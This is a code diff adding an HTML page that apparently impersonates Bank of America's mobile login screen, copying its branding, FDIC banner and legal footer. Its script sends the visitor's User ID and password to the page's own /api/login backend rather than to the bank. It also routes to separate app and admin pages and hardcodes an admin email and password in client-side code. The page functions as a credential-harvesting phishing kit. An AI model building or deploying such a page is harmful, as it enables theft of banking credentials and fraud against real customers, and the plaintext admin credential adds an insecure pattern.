@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bank of America - Log In</title>
+    <style>
+        /* --- RESET & VARIABLES --- */
+        :root {
+            --bofa-red: #d4001a; 
+            --bofa-blue: #004a99; 
+            --bg-gray-banner: #f2f2f2;
+            --bg-off-white: #f8f8f8;
+            --text-dark: #333333;
+            --text-gray: #666666;
+            --border-light: #cccccc;
+            --input-border: #b3b3b3;
+            --placeholder-gray: #a6a6a6;
+            --toggle-gray-bg: #b8b8b8;
+            --toggle-knob-lines: #d9d9d9;
+            
+            /* Button Colors */
+            --btn-disabled-top: #92c2e9;
+            --btn-disabled-bottom: #72a9d6;
+            --btn-active-top: #005eb8;
+            --btn-active-bottom: #005eb8;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: var(--bg-off-white);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* --- HEADER BANNER --- */
+        .fdic-banner {
+            background-color: var(--bg-gray-banner);
+            text-align: center;
+            padding: 12px 10px;
+            color: var(--text-gray);
+        }
+
+        .banner-top-text {
+            font-size: 13px;
+            font-style: italic;
+            font-family: "Times New Roman", serif;
+            margin-bottom: 4px;
+        }
+
+        .banner-bottom-row {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .fdic-bold {
+            font-family: Arial, sans-serif;
+            font-weight: 900;
+            font-size: 15px;
+            color: #002a5c;
+            margin-right: 4px;
+        }
+
+        .fdic-desc {
+            font-size: 11px;
+            font-style: italic;
+            font-family: "Times New Roman", serif;
+        }
+
+        /* --- NAVIGATION BAR --- */
+        .login-nav {
+            background-color: var(--bofa-red);
+            height: 50px;
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            position: relative;
+        }
+
+        .menu-btn {
+            background: none;
+            border: none;
+            padding: 5px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            position: absolute;
+            left: 10px;
+        }
+
+        .menu-icon-svg {
+            width: 26px;
+            height: 22px;
+            fill: white;
+        }
+
+        .login-title {
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 0 auto;
+        }
+
+        /* --- MAIN FORM SECTION --- */
+        main {
+            flex-grow: 1;
+            padding: 25px 20px;
+            display: flex;
+            flex-direction: column;
+            background-color: var(--bg-off-white);
+        }
+
+        .form-row-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 10px; /* Reduced slightly to fit errors if needed */
+        }
+
+        .user-id-container {
+            flex-grow: 1;
+            margin-right: 20px;
+        }
+
+        .standard-input {
+            width: 100%;
+            padding: 12px 15px;
+            font-size: 16px;
+            border: 1px solid var(--input-border);
+            border-radius: 6px;
+            background-color: #fff;
+            box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);
+            outline: none;
+            color: var(--text-dark);
+        }
+
+        ::placeholder {
+            color: var(--placeholder-gray);
+            opacity: 1;
+        }
+
+        .save-id-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 5px;
+        }
+
+        .save-id-label {
+            font-size: 14px;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+        }
+
+        .toggle-switch {
+            position: relative;
+            width: 58px;
+            height: 28px;
+            display: block;
+        }
+
+        .toggle-switch input {
+            display: none;
+        }
+
+        .slider {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-color: var(--toggle-gray-bg);
+            border-radius: 4px;
+            transition: 0.3s;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 22px;
+            width: 26px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            border-radius: 3px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+            transition: 0.3s;
+            background-image: linear-gradient(to right, 
+                transparent 9px, 
+                var(--toggle-knob-lines) 10px, transparent 11px, 
+                transparent 13px, 
+                var(--toggle-knob-lines) 14px, transparent 15px,
+                transparent 17px,
+                var(--toggle-knob-lines) 18px, transparent 19px
+            );
+            z-index: 2;
+        }
+
+        .slider:after {
+            content: 'NO';
+            color: white;
+            font-size: 11px;
+            font-weight: bold;
+            position: absolute;
+            right: 7px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-family: Arial, sans-serif;
+        }
+
+        input:checked + .slider { background-color: #00c853; }
+        input:checked + .slider:before { transform: translateX(26px); }
+        input:checked + .slider:after { content: ''; }
+
+        .form-row-password {
+            margin-bottom: 25px;
+            margin-top: 15px;
+        }
+
+        /* --- LOG IN BUTTON STYLES --- */
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            background: linear-gradient(to bottom, var(--btn-disabled-top), var(--btn-disabled-bottom));
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            transition: background 0.3s ease;
+        }
+
+        .login-btn.active {
+            background: var(--bofa-blue);
+        }
+
+        .login-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .btn-lock-icon {
+            width: 18px;
+            height: 18px;
+            fill: white;
+            margin-right: 10px;
+        }
+
+        .helper-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 25px;
+            padding: 0 10px;
+        }
+
+        .helper-links a {
+            color: var(--bofa-blue);
+            font-size: 15px;
+            text-decoration: none;
+        }
+
+        /* --- ERROR MESSAGE STYLES --- */
+        .error-message {
+            color: #d4001a;
+            font-size: 13px;
+            margin-top: 5px;
+            display: none; /* Hidden by default */
+            font-weight: bold;
+        }
+        .error-message.show {
+            display: block;
+        }
+
+        /* --- FOOTER --- */
+        footer {
+            background-color: var(--bg-off-white);
+            text-align: center;
+            padding: 20px 15px 30px;
+            font-size: 11px;
+            color: var(--text-gray);
+        }
+
+        .footer-nav {
+            margin-bottom: 18px;
+            line-height: 1.8;
+            color: var(--bofa-blue);
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        
+        .footer-nav a {
+            color: var(--bofa-blue);
+            text-decoration: none;
+            white-space: nowrap;
+        }
+
+        .footer-separator {
+            margin: 0 5px;
+            color: var(--border-light);
+        }
+
+        .footer-legal p {
+            margin: 6px 0;
+            line-height: 1.3;
+        }
+
+        .blue-link {
+            color: var(--bofa-blue);
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="fdic-banner">
+        <p class="banner-top-text">Bank of America deposit products:</p>
+        <div class="banner-bottom-row">
+            <span class="fdic-bold">FDIC</span>
+            <span class="fdic-desc">FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
+        </div>
+    </div>
+
+    <nav class="login-nav">
+        <button class="menu-btn" aria-label="Menu">
+            <svg class="menu-icon-svg" viewBox="0 0 24 24">
+                <path d="M3 4H21V7H3V4ZM3 10.5H21V13.5H3V10.5ZM3 17H21V20H3V17Z"/>
+            </svg>
+        </button>
+        <h1 class="login-title">Log In</h1>
+    </nav>
+
+    <main>
+        <form id="loginForm">
+            <div class="form-row-top">
+                <div class="user-id-container">
+                    <input type="text" id="user-id" name="email" class="standard-input" placeholder="User ID" aria-label="User ID" autocomplete="username">
+                    <div class="error-message" id="emailError"></div>
+                </div>
+                <div class="save-id-section">
+                    <label for="save-id-toggle" class="save-id-label">Save ID</label>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="save-id-toggle">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+
+            <div class="form-row-password">
+                <input type="password" id="password" name="password" class="standard-input" placeholder="Password" aria-label="Password" autocomplete="current-password">
+                <div class="error-message" id="passwordError"></div>
+            </div>
+
+            <div class="error-message" id="generalError" style="margin-bottom: 10px; text-align: center;"></div>
+
+            <button type="submit" id="loginBtn" class="login-btn">
+                <svg class="btn-lock-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                    <path d="M12 2C9.243 2 7 4.243 7 7V10H6C4.895 10 4 10.895 4 12V20C4 21.105 4.895 22 6 22H18C19.105 22 20 21.105 20 20V12C20 10.895 19.105 10 18 10H17V7C17 4.243 14.757 2 12 2ZM9 7C9 5.346 10.346 4 12 4C13.654 4 15 5.346 15 7V10H9V7ZM12 17C10.896 17 10 16.104 10 15C10 13.896 10.896 13 12 13C13.104 13 14 13.896 14 15C14 16.104 13.104 17 12 17Z"/>
+                </svg>
+                Log In
+            </button>
+
+            <div class="helper-links">
+                <a href="#">Forgot ID/Password?</a>
+                <a href="register.html">Enroll</a>
+            </div>
+        </form>
+    </main>
+
+    <footer>
+        <nav class="footer-nav">
+            <a href="#">Locations</a><span class="footer-separator">|</span>
+            <a href="#">Contact Us</a><span class="footer-separator">|</span>
+            <a href="#">Help & Support</a><span class="footer-separator">|</span>
+            <a href="#">Accessible Banking</a><span class="footer-separator">|</span>
+            <a href="#">Privacy</a><span class="footer-separator">|</span>
+            <a href="#">Children's Privacy</a><span class="footer-separator">|</span>
+            <a href="#">Security</a><span class="footer-separator">|</span>
+            <a href="#">Online Banking Service Agreement</a><span class="footer-separator">|</span>
+            <a href="#">Advertising Practices</a><span class="footer-separator">|</span>
+            <a href="#">Careers</a><span class="footer-separator">|</span>
+            <a href="#">Your Privacy Choices</a>
+        </nav>
+        <div class="footer-legal">
+            <p>Bank of America, N.A. Member FDIC. <a href="#" class="blue-link">Equal Housing Lender</a></p>
+            <p>© 2025 Bank of America Corporation. All rights reserved.</p>
+            <p><a href="#" class="blue-link">Patent: patents.bankofamerica.com</a></p>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const loginForm = document.getElementById('loginForm');
+            const userIdInput = document.getElementById('user-id'); // Visual ID
+            const passwordInput = document.getElementById('password');
+            const loginBtn = document.getElementById('loginBtn');
+            const btnOriginalText = loginBtn.innerHTML;
+
+            // --- 1. VISUAL: Dark Blue Button Logic ---
+            function checkInputs() {
+                if (userIdInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
+                    loginBtn.classList.add('active');
+                } else {
+                    loginBtn.classList.remove('active');
+                }
+            }
+            userIdInput.addEventListener('input', checkInputs);
+            passwordInput.addEventListener('input', checkInputs);
+
+            // --- 2. FUNCTIONAL: API & Logic from Sample Script ---
+            
+            // Check for existing session on load
+            const token = localStorage.getItem('authToken');
+            const userId = localStorage.getItem('userId');
+            const adminToken = localStorage.getItem('adminToken');
+            
+            if (token && userId) {
+                window.location.href = 'app.html';
+            } else if (adminToken) {
+                window.location.href = 'admin.html';
+            }
+
+            loginForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                
+                // Map the visual "User ID" to the logical "email" variable
+                const email = userIdInput.value.trim();
+                const password = passwordInput.value;
+
+                // Clear previous errors
+                document.getElementById('emailError').classList.remove('show');
+                document.getElementById('passwordError').classList.remove('show');
+                document.getElementById('generalError').classList.remove('show');
+
+                // Validation
+                let hasError = false;
+                if (!email) {
+                    document.getElementById('emailError').textContent = 'User ID is required';
+                    document.getElementById('emailError').classList.add('show');
+                    hasError = true;
+                }
+                if (!password) {
+                    document.getElementById('passwordError').textContent = 'Password is required';
+                    document.getElementById('passwordError').classList.add('show');
+                    hasError = true;
+                }
+                if (hasError) return;
+
+                // ADMIN LOGIN CHECK
+                if (email === 'admin@bankofAmerica.com' && password === '3s8ZG9gwFTXe') {
+                    localStorage.setItem('adminToken', 'admin-token-' + Date.now());
+                    localStorage.setItem('adminName', 'Administrator');
+                    window.location.href = 'admin.html';
+                    return;
+                }
+
+                // Prepare Button for Loading State
+                loginBtn.disabled = true;
+                loginBtn.innerHTML = 'Signing in...'; 
+                loginBtn.classList.remove('active'); // Remove active color while loading
+
+                try {
+                    // API Call
+                    const response = await fetch('/api/login', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ email, password })
+                    });
+
+                    const data = await response.json();
+
+                    if (!response.ok) {
+                        document.getElementById('generalError').textContent = data.message || 'Login failed. Please check your details.';
+                        document.getElementById('generalError').classList.add('show');
+                    } else {
+                        // Success
+                        localStorage.setItem('authToken', data.token);
+                        localStorage.setItem('userId', data.userId);
+                        window.location.href = 'app.html';
+                    }
+                } catch (error) {
+                    console.error('Login error:', error);
+                    document.getElementById('generalError').textContent = 'An error occurred. Please try again later.';
+                    document.getElementById('generalError').classList.add('show');
+                } finally {
+                    // Reset Button State
+                    loginBtn.disabled = false;
+                    loginBtn.innerHTML = btnOriginalText;
+                    checkInputs(); // Re-apply active blue color if inputs are still full
+                }
+            });
+        });
+    </script>
+</body>
+</html>
